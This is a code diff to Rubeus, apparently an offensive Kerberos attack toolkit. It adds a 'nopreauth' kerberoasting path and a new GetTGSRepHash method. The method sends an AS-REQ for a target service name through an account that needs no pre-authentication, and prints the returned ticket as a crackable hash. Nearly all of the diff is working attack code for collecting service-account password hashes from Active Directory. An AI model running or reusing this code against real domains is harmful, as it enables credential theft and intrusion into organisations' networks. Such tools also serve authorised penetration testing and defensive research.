@@ -181,11 +181,15 @@ namespace Rubeus
             }
         }
 
-        public static void Kerberoast(string spn = "", List<string> spns = null, string userName = "", string OUName = "", string domain = "", string dc = "", System.Net.NetworkCredential cred = null, string outFile = "", bool simpleOutput = false, KRB_CRED TGT = null, bool useTGTdeleg = false, string supportedEType = "rc4", string pwdSetAfter = "", string pwdSetBefore = "", string ldapFilter = "", int resultLimit = 0, int delay = 0, int jitter = 0, bool userStats = false, bool enterprise = false, bool autoenterprise = false, bool ldaps = false)
+        public static void Kerberoast(string spn = "", List<string> spns = null, string userName = "", string OUName = "", string domain = "", string dc = "", System.Net.NetworkCredential cred = null, string outFile = "", bool simpleOutput = false, KRB_CRED TGT = null, bool useTGTdeleg = false, string supportedEType = "rc4", string pwdSetAfter = "", string pwdSetBefore = "", string ldapFilter = "", int resultLimit = 0, int delay = 0, int jitter = 0, bool userStats = false, bool enterprise = false, bool autoenterprise = false, bool ldaps = false, string nopreauth = null)
         {
             if (userStats)
             {
                 Console.WriteLine("[*] Listing statistics about target users, no ticket requests being performed.");
+            }
+            else if (!String.IsNullOrWhiteSpace(nopreauth))
+            {
+                Console.WriteLine(String.Format("[*] Using {0} without pre-auth to request service tickets", nopreauth));
             }
             else if (TGT != null)
             {
@@ -224,7 +228,12 @@ namespace Rubeus
             {
                 Console.WriteLine("\r\n[*] Target SPN             : {0}", spn);
 
-                if (TGT != null)
+                if (!String.IsNullOrWhiteSpace(nopreauth))
+                {
+                    // if /nopreauth is supplied, use the user account specified without pre-auth
+                    GetTGSRepHash(nopreauth, spn, spn, "DISTINGUISHEDNAME", outFile, simpleOutput, dc, domain, Interop.KERB_ETYPE.rc4_hmac);
+                }
+                else if (TGT != null)
                 {
                     // if a TGT .kirbi is supplied, use that for the request
                     //      this could be a passed TGT or if TGT delegation is specified
@@ -242,7 +251,12 @@ namespace Rubeus
                 {
                     Console.WriteLine("\r\n[*] Target SPN             : {0}", s);
 
-                    if (TGT != null)
+                    if (!String.IsNullOrWhiteSpace(nopreauth))
+                    {
+                        // if /nopreauth is supplied, use the user account specified without pre-auth
+                        GetTGSRepHash(nopreauth, s, s, "DISTINGUISHEDNAME", outFile, simpleOutput, dc, domain, Interop.KERB_ETYPE.rc4_hmac);
+                    }
+                    else if (TGT != null)
                     {
                         // if a TGT .kirbi is supplied, use that for the request
                         //      this could be a passed TGT or if TGT delegation is specified
@@ -744,6 +758,67 @@ namespace Rubeus
                 KRB_CRED tgsKirbi = new KRB_CRED(tgsBytes);
                 DisplayTGShash(tgsKirbi, true, userName, tgtDomain, outFile, simpleOutput);
                 Console.WriteLine();
+                return true;
+            }
+
+            return false;
+        }
+
+        public static bool GetTGSRepHash(string nopreauth, string spn, string userName = "user", string distinguishedName = "", string outFile = "", bool simpleOutput = false, string domainController = "", string domain = "", Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial)
+        {
+            AS_REQ NoPreAuthASREQ = AS_REQ.NewASReq(nopreauth, domain, requestEType, false, spn);
+            byte[] reqBytes = NoPreAuthASREQ.Encode().Encode();
+
+            string dcIP = Networking.GetDCIP(domainController, true, domain);
+            if (String.IsNullOrEmpty(dcIP)) { return false; }
+
+            byte[] response = Networking.SendBytes(dcIP, 88, reqBytes);
+
+            if (response == null)
+            {
+                return false;
+            }
+
+            // decode the supplied bytes to an AsnElt object
+            AsnElt responseAsn = AsnElt.Decode(response);
+
+            // check the response value
+            int responseTag = responseAsn.TagValue;
+
+            if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.AS_REP)
+            {
+                // parse the response to an AS-REP
+                AS_REP rep = new AS_REP(responseAsn);
+
+                // now build the final KRB-CRED structure
+                KRB_CRED cred = new KRB_CRED();
+
+                // add the ticket
+                cred.tickets.Add(rep.ticket);
+
+                // build the EncKrbCredPart/KrbCredInfo parts from the ticket and the data in the encRepPart
+
+                KrbCredInfo info = new KrbCredInfo();
+
+                // [1] prealm (domain)
+                info.prealm = domain;
+
+                // [2] pname (user)
+                info.pname.name_type = rep.cname.name_type;
+                info.pname.name_string = rep.cname.name_string;
+
+                // [8] srealm
+                info.srealm = domain;
+
+                // [9] sname
+                info.sname.name_type = NoPreAuthASREQ.req_body.sname.name_type;
+                info.sname.name_string = NoPreAuthASREQ.req_body.sname.name_string;
+
+                // add the ticket_info into the cred object
+                cred.enc_part.ticket_info.Add(info);
+
+                DisplayTGShash(cred, true, userName, domain, outFile, simpleOutput);
+
                 return true;
             }
 
